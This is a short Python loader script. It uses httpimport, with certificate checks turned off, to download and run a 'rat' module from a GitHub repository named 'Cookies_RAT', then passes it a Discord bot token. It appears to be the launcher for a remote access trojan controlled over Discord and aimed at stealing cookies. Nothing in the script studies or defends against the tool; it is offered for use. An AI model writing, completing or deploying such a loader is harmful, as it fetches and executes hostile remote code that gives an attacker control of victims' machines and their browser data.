import httpimport
httpimport.INSECURE = True
Github_username = "GITHUB_USERNAME_HERE"
with httpimport.remote_repo(["rat"], f"https://raw.githubusercontent.com/{Github_username}/Cookies_RAT/master/src"): import rat
rat.token_set("DISCORD_TOKEN_HERE")